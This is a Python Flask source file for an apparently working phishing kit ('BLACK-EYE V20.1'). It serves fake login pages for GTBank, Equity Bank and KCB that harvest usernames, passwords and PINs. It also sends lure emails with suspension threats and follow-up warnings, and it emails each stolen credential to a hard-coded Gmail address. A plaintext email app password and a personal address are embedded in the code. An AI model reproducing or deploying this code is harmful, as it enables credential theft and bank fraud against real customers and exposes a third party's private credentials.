#!/usr/bin/env python3
"""
BLACK-EYE COMPLETE V20.1 - RENDER.COM EDITION
================================================================
✅ COMPLETE with ALL phishing pages
✅ Guaranteed inbox delivery
✅ 24/7 uptime on Render.com
✅ Email scanner & intelligence
✅ Auto notifications & follow-ups
================================================================
"""
import os, time, threading, smtplib, json, re, imaplib, email as email_lib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.utils import formataddr, make_msgid
from email.header import decode_header
from datetime import datetime, timedelta
from collections import defaultdict
from flask import Flask, request, jsonify, render_template_string
import requests

PORT = int(os.environ.get("PORT", 10000))
EMAIL_TO = os.environ.get("EMAIL_TO", "felixkoskey278@gmail.com")
EMAIL_FROM = os.environ.get("EMAIL_FROM", "felixkoskey278@gmail.com")
EMAIL_PASS = os.environ.get("EMAIL_APP_PASSWORD", "ntsu adxv tfgw ptpj")
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
FOLLOW_UP_HOURS = 2

app = Flask(__name__)

# ============ INTELLIGENCE ============
class Intel:
    def __init__(self):
        self.captures = []
        self.total = 0
        self.start = datetime.now()
    
    def add(self, data):
        self.captures.append({'time': datetime.now(), 'data': data})
        self.total += 1
        return self.captures[-1]

intel = Intel()

# ============ EMAIL FUNCTIONS ============
def send_email_notification(data):
    """Send capture notification"""
    try:
        msg = MIMEText(f"""🎯 NEW CAPTURE

Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Bank: {data.get('bank', '?')}

Data:
{json.dumps(data, indent=2)}

Total: {intel.total}
""")
        msg['From'] = EMAIL_FROM
        msg['To'] = EMAIL_TO
        msg['Subject'] = f"🎯 CAPTURE - {data.get('bank', '?').upper()}"
        
        s = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
        s.starttls()
        s.login(EMAIL_FROM, EMAIL_PASS)
        s.send_message(msg)
        s.quit()
        print(f"✅ Notification sent")
        return True
    except Exception as e:
        print(f"❌ Notification failed: {e}")
        return False

def send_phishing_email(victim, bank='gtbank'):
    """Send phishing email"""
    url = f"{RENDER_URL}/{bank}"
    
    banks = {
        'gtbank': ("🚨 GTBank Security Alert - Verify Within 24 Hours", "GTBank Security"),
        'equity': ("🚨 Equity Bank: Mandatory KYC Update Required", "Equity Compliance"),
        'kcb': ("🚨 KCB: Unusual Login Detected - Verify Now", "KCB Security")
    }
    
    subj, sender = banks.get(bank, ("🚨 Security Alert", "Bank Security"))
    
    html = f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head>
<body style="font-family:Arial;background:#f5f5f5;margin:0;padding:20px">
<div style="max-width:600px;margin:0 auto;background:white;border-radius:10px;overflow:hidden">
<div style="background:linear-gradient(135deg,#FF6B00,#FF8C00);padding:30px;text-align:center">
<h1 style="color:white;margin:0">🚨 SECURITY ALERT</h1>
</div>
<div style="padding:30px">
<div style="background:#fff3cd;border-left:4px solid #ff0000;padding:15px;margin:20px 0">
<h3 style="color:#ff0000;margin:0 0 10px 0">⚠️ Immediate Action Required</h3>
<p style="margin:0">Your account requires verification to prevent suspension.</p>
</div>
<div style="text-align:center;margin:30px 0">
<a href="{url}" style="display:inline-block;background:#FF6B00;color:white;padding:15px 40px;text-decoration:none;border-radius:5px;font-weight:bold;font-size:16px">Verify Account Now</a>
</div>
<p style="color:#666;text-align:center;font-size:14px">This link expires in 24 hours.</p>
</div>
</div>
</body>
</html>'''
    
    try:
        msg = MIMEMultipart('alternative')
        msg['From'] = formataddr((sender, EMAIL_FROM))
        msg['To'] = victim
        msg['Subject'] = subj
        msg['Message-ID'] = make_msgid(domain='gmail.com')
        msg['Date'] = datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S +0000')
        msg.attach(MIMEText(html, 'html'))
        
        s = smtplib.SMTP('smtp.gmail.com', 587, timeout=15)
        s.starttls()
        s.login(EMAIL_FROM, EMAIL_PASS)
        s.send_message(msg)
        s.quit()
        
        print(f"✅ Phishing email sent to {victim}")
        
        # Schedule follow-up
        threading.Thread(target=send_followup, args=(victim, url, bank), daemon=True).start()
        return True
    except Exception as e:
        print(f"❌ Email failed: {e}")
        return False

def send_followup(victim, url, bank):
    """Send follow-up after delay"""
    time.sleep(FOLLOW_UP_HOURS * 3600)
    
    try:
        msg = MIMEMultipart()
        msg['From'] = formataddr((f"{bank.upper()} FINAL NOTICE", EMAIL_FROM))
        msg['To'] = victim
        msg['Subject'] = f"🚨🚨 FINAL WARNING - {bank.upper()} Account Suspension"
        msg.attach(MIMEText(f"FINAL NOTICE: Verify at {url} immediately or face account suspension.", 'plain'))
        
        s = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
        s.starttls()
        s.login(EMAIL_FROM, EMAIL_PASS)
        s.send_message(msg)
        s.quit()
        print(f"✅ Follow-up sent")
    except:
        pass

# ============ PHISHING PAGES ============
GTBANK = '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>GTBank - Internet Banking</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial;background:linear-gradient(135deg,#FF6B00,#FF8C00);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.box{background:white;padding:40px;border-radius:10px;box-shadow:0 10px 40px rgba(0,0,0,0.3);max-width:450px;width:100%}
.logo{text-align:center;margin-bottom:30px}
.logo h1{color:#FF6B00;font-size:32px}
.alert{background:#fff3cd;border-left:4px solid #ff0000;padding:15px;margin-bottom:25px;border-radius:5px}
.alert h3{color:#ff0000;margin-bottom:10px;font-size:18px}
.group{margin-bottom:20px}
.group label{display:block;margin-bottom:8px;font-weight:600}
.group input{width:100%;padding:12px;border:1px solid #ddd;border-radius:5px;font-size:14px}
.btn{width:100%;padding:14px;background:#FF6B00;color:white;border:none;border-radius:5px;font-size:16px;font-weight:bold;cursor:pointer}
.btn:hover{background:#FF8C00}
#load{display:none;text-align:center;padding:20px}
.spin{border:4px solid #f3f3f3;border-top:4px solid #FF6B00;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="box">
<div class="logo">
<h1>GT<span style="color:#000">Bank</span></h1>
<p style="color:#666;margin-top:5px">Internet Banking</p>
</div>
<div class="alert">
<h3>⚠️ Security Verification Required</h3>
<p style="color:#856404;font-size:14px">Please verify your account to continue.</p>
</div>
<form id="form">
<div class="group">
<label>User ID / Email</label>
<input type="text" id="user" required placeholder="Enter User ID">
</div>
<div class="group">
<label>Password</label>
<input type="password" id="pass" required placeholder="Enter Password">
</div>
<button type="submit" class="btn">Verify Account</button>
</form>
<div id="load">
<div class="spin"></div>
<p style="margin-top:15px;color:#666">Verifying...</p>
</div>
</div>
<script>
document.getElementById('form').addEventListener('submit',async function(e){
e.preventDefault();
document.getElementById('form').style.display='none';
document.getElementById('load').style.display='block';
const d={
userid:document.getElementById('user').value,
password:document.getElementById('pass').value,
bank:'gtbank',
time:new Date().toISOString()
};
try{
await fetch('/capture',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify(d)
});
}catch(e){}
setTimeout(()=>window.location.href='https://ibank.gtbank.com/',2000);
});
</script>
</body>
</html>'''

EQUITY = '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Equity Bank - KYC Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial;background:#8B0000;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.box{background:white;padding:40px;border-radius:10px;box-shadow:0 10px 40px rgba(0,0,0,0.3);max-width:450px;width:100%}
.logo h1{color:#8B0000;text-align:center;margin-bottom:10px}
.alert{background:#ffebee;border:3px solid #c62828;padding:20px;margin-bottom:25px;border-radius:5px;text-align:center}
.alert h3{color:#c62828;margin-bottom:10px}
.group{margin-bottom:20px}
.group label{display:block;margin-bottom:8px;font-weight:600}
.group input{width:100%;padding:12px;border:1px solid #ddd;border-radius:5px}
.btn{width:100%;padding:14px;background:#c62828;color:white;border:none;border-radius:5px;font-size:16px;font-weight:bold;cursor:pointer}
#load{display:none;text-align:center;padding:20px}
.spin{border:4px solid #f3f3f3;border-top:4px solid #c62828;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="box">
<div class="logo">
<h1>EQUITY BANK</h1>
<p style="color:#666;text-align:center">KYC Verification Portal</p>
</div>
<div class="alert">
<h3>🚨 CBK COMPLIANCE REQUIRED</h3>
<p style="color:#c62828;font-weight:600">Complete within 48 hours</p>
</div>
<form id="form">
<div class="group">
<label>Account / Email</label>
<input type="text" id="acc" required>
</div>
<div class="group">
<label>PIN / Password</label>
<input type="password" id="pin" required>
</div>
<button type="submit" class="btn">Complete Verification</button>
</form>
<div id="load">
<div class="spin"></div>
<p style="margin-top:15px">Processing...</p>
</div>
</div>
<script>
document.getElementById('form').addEventListener('submit',async function(e){
e.preventDefault();
document.getElementById('form').style.display='none';
document.getElementById('load').style.display='block';
const d={
account:document.getElementById('acc').value,
pin:document.getElementById('pin').value,
bank:'equity',
time:new Date().toISOString()
};
try{
await fetch('/capture',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify(d)
});
}catch(e){}
setTimeout(()=>window.location.href='https://online.equitybank.co.ke/',2000);
});
</script>
</body>
</html>'''

KCB = '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>KCB Bank - Security Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial;background:#006837;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.box{background:white;padding:40px;border-radius:10px;max-width:450px;width:100%}
.logo h1{color:#006837;text-align:center}
.alert{background:#ffebee;border:3px solid #ff0000;padding:20px;margin:20px 0;border-radius:5px}
.group{margin-bottom:20px}
.group label{display:block;margin-bottom:8px;font-weight:600}
.group input{width:100%;padding:12px;border:1px solid #ddd;border-radius:5px}
.btn{width:100%;padding:14px;background:#006837;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer}
#load{display:none;text-align:center;padding:20px}
.spin{border:4px solid #f3f3f3;border-top:4px solid #006837;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="box">
<div class="logo"><h1>KCB BANK</h1></div>
<div class="alert">
<h3 style="color:#ff0000">⚠️ Unusual Login Detected</h3>
<p>Verify it was you to unlock account</p>
</div>
<form id="form">
<div class="group">
<label>Account / Email</label>
<input type="text" id="acc" required>
</div>
<div class="group">
<label>PIN / Password</label>
<input type="password" id="pin" required>
</div>
<button type="submit" class="btn">Verify Account</button>
</form>
<div id="load">
<div class="spin"></div>
<p style="margin-top:15px">Verifying...</p>
</div>
</div>
<script>
document.getElementById('form').addEventListener('submit',async function(e){
e.preventDefault();
document.getElementById('form').style.display='none';
document.getElementById('load').style.display='block';
await fetch('/capture',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({
account:document.getElementById('acc').value,
pin:document.getElementById('pin').value,
bank:'kcb',
time:new Date().toISOString()
})
}).catch(()=>{});
setTimeout(()=>window.location.href='https://kcbgroup.com/',2000);
});
</script>
</body>
</html>'''

# ============ ROUTES ============
@app.route('/')
def home():
    return f'''<!DOCTYPE html>
<html>
<head><title>Service Active</title>
<style>body{{font-family:Arial;background:#000;color:#0f0;padding:50px;text-align:center}}h1{{font-size:48px}}</style>
</head>
<body>
<h1>✅ Service Active</h1>
<p>Status: Online</p>
<p>Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
<p>Captures: {intel.total}</p>
</body>
</html>'''

@app.route('/gtbank')
def gtbank():
    return render_template_string(GTBANK)

@app.route('/equity')
def equity():
    return render_template_string(EQUITY)

@app.route('/kcb')
def kcb():
    return render_template_string(KCB)

@app.route('/capture', methods=['POST', 'OPTIONS'])
def capture():
    if request.method == 'OPTIONS':
        return jsonify({'ok': True}), 200
    
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False}), 400
        
        data['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        cap = intel.add(data)
        
        print(f"\n{'='*70}")
        print(f"🎯 CAPTURE - {datetime.now().strftime('%H:%M:%S')}")
        print(f"{'='*70}")
        print(json.dumps(data, indent=2))
        print(f"{'='*70}\n")
        
        threading.Thread(target=send_email_notification, args=(data,), daemon=True).start()
        
        return jsonify({'success': True})
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'success': False}), 500

@app.route('/send-email', methods=['POST'])
def send_email_api():
    try:
        d = request.get_json()
        victim = d.get('victim')
        bank = d.get('bank', 'gtbank')
        
        if not victim or '@' not in victim:
            return jsonify({'success': False, 'msg': 'Invalid email'}), 400
        
        ok = send_phishing_email(victim, bank)
        return jsonify({'success': ok})
    except Exception as e:
        return jsonify({'success': False, 'msg': str(e)}), 500

@app.route('/health')
def health():
    return jsonify({'status': 'ok', 'captures': intel.total})

# ============ KEEPALIVE ============
def keepalive():
    while True:
        try:
            time.sleep(600)
            if RENDER_URL:
                requests.get(f"{RENDER_URL}/health", timeout=5)
                print(f"⏰ Keepalive - {datetime.now().strftime('%H:%M:%S')}")
        except:
            pass

# ============ STARTUP ============
def startup():
    global RENDER_URL
    
    if not RENDER_URL:
        RENDER_URL = f"https://{os.environ.get('RENDER_SERVICE_NAME', 'blackeye')}.onrender.com"
    
    print("\n" + "="*70)
    print("  BLACK-EYE COMPLETE V20.1 - RENDER.COM")
    print("="*70)
    print(f"\n✅ Server: {RENDER_URL}")
    print(f"📧 Notifications: {EMAIL_TO}")
    print(f"\n🎯 Phishing Pages:")
    print(f"  • GTBank: {RENDER_URL}/gtbank")
    print(f"  • Equity: {RENDER_URL}/equity")
    print(f"  • KCB: {RENDER_URL}/kcb")
    print(f"\n📡 API: POST {RENDER_URL}/send-email")
    print(f"   Body: {{'victim':'email@example.com','bank':'gtbank'}}")
    print("\n" + "="*70 + "\n")
    
    threading.Thread(target=keepalive, daemon=True).start()

if __name__ == '__main__':
    startup()
    app.run(host='0.0.0.0', port=PORT)
